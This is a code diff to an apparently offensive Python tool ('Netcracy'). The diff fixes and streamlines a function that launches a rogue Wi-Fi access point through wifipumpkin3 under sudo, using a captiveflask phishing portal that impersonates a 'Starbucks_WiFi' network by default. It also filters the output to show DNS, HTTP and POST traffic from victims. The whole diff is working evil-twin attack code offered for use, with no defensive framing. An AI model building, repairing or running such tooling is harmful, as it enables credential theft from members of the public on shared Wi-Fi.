@@ -68,44 +68,47 @@ def enforce_monitor_mode(interface):
 #               COMMAND ENGINE EXECUTION FUNCTIONS
 # ============================================================================
 def handle_rogue_ap(args):
-    target_device = args if len(args) >= 1 else "wlan0"
-    chosen_template = args if len(args) >= 2 else "starbucks"
-    chosen_ssid = args if len(args) >= 3 else "Starbucks_WiFi"
+    target_device = args[0] if len(args) >= 1 else "wlan0"
+    chosen_template = args[1] if len(args) >= 2 else "starbucks"
+    chosen_ssid = args[2] if len(args) >= 3 else "Starbucks_WiFi"
     
     print(f"\n[+] Netcracy -> Initializing Rogue AP Subsystems...")
     print(f"[*] Interface : {target_device}")
     print(f"[*] Template  : {chosen_template}")
     print(f"[*] SSID      : {chosen_ssid}\n")
 
+    xpulp_cmd = (
+        f"set interface {target_device}; "
+        f"set ssid {chosen_ssid}; "
+        f"set proxy captiveflask; "
+        f"set captiveflask.template {chosen_template}; "
+        f"start"
+    )
+
     process = subprocess.Popen(
-        ["sudo", "wifipumpkin3"],
-        stdin=subprocess.PIPE,
+        ["sudo", "wifipumpkin3", "-x", xpulp_cmd],
         stdout=subprocess.PIPE,
         stderr=subprocess.STDOUT,
         text=True,
         bufsize=1
     )
 
-    # Give wifipumpkin3 0.3s per command so captiveflask & pydns_server load before 'start'
-    setup_cmds = [
-        f"set interface {target_device}\n",
-        f"set ssid {chosen_ssid}\n",
-        "set proxy captiveflask\n",
-        f"set captiveflask.template {chosen_template}\n"
-    ]
-    for cmd in setup_cmds:
-        process.stdin.write(cmd)
-        process.stdin.flush()
-        time.sleep(0.3)
-
-    process.stdin.write("start\n")
-    process.stdin.flush()
-
     allowed_tags = [
         "[+]", "[*]", "[-]", "[!]", 
         "hostapd", "dhcp", "pydhcp", "captiveflask", 
-        "pydns", "dns", "http", "post", "get"
+        "pydns", "dns", "http", "post", "get", "error"
     ]
+
+    try:
+        for line in process.stdout:
+            clean_line = line.replace("wp3 >", "").strip()
+            if any(tag in clean_line.lower() for tag in allowed_tags):
+                if "unknown plugin" not in clean_line.lower():
+                    print(clean_line)
+    except KeyboardInterrupt:
+        print("\n[*] Stopping Rogue AP subsystems...")
+        process.terminate()
+        
     
 
 def handle_wlan0mon(args):
